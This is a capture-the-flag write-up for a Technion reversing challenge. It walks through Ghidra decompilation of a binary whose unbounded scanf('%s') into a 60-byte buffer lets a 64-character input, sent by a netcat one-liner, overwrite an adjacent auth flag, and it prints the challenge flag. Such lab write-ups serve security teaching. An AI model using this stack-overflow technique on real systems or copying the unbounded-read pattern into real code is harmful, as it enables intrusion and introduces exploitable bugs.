# Faculta Necshevet Identifier 
Category: Reversing & Binary Exploitation

## Description
> DuckyDebugDuck decided to continue development on his "Faculta Necshevet Identifier" from the initial challenge and finally finished the first version, he told us that if you're from a "Faculta Necshevet" then you'll get a flag!

A binary file was attached.

## Solution

Let's run the attached file:

```console
root@kali:/media/sf_CTFs/technion/Faculta_Necshevet_Identifier# ./facultaNecshevetIdentifier
My name is DuckyDebugDuck, what's yours? test
Hi test, checking...
You're not from a faculta necshevet, you won't get the flag
```

We must enter the correct name in order to be identified as worthy to get the flag.

Let's check the decompilation with Ghidra:

```c
undefined8 main(void)

{
  undefined user_input [60];
  int is_auth;
  
  is_auth = 0;
  printf("My name is DuckyDebugDuck, what\'s yours? ");
  __isoc99_scanf(&DAT_00102032,user_input);
  printf("Hi %s, checking...\n",user_input);
  if (is_auth == 0) {
    puts("You\'re not from a faculta necshevet, you won\'t get the flag");
  }
  else {
    puts("YOU\'RE FROM A FACULTA NECHSEVET, here\'s the flag: ##############");
  }
  return 0;
}
```

We can see that the user input is read into a 60 byte buffer. However, the length of the input read from the user isn't limited to 60:
```assembly
                             DAT_00102032                                    XREF[1]:     main:001011b4(*)  
        00102032 25              ??         25h    %
        00102033 73              ??         73h    s
        00102034 00              ??         00h
```

Therefore, we can enter a string of any length and override other stack members, such as `is_auth`. If we override `is_auth` with any value other than 0, we will get the flag.

In order to override `is_auth`, we'll send a name of length 64 - 60 characters to fill up the `user_input` buffer and four more to reach `is_auth` and change its boolean value to "true":


```console
root@kali:/media/sf_CTFs/technion/Faculta_Necshevet_Identifier# python -c "print('a'*64)" | nc ctf.cs.technion.ac.il 4005
My name is DuckyDebugDuck, what's yours? Hi aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa, checking...
YOU'RE FROM A FACULTA NECHSEVET, here's the flag: cstechnion{kn0w_th3_l1m1ts_4nd_br34k_th3m}
```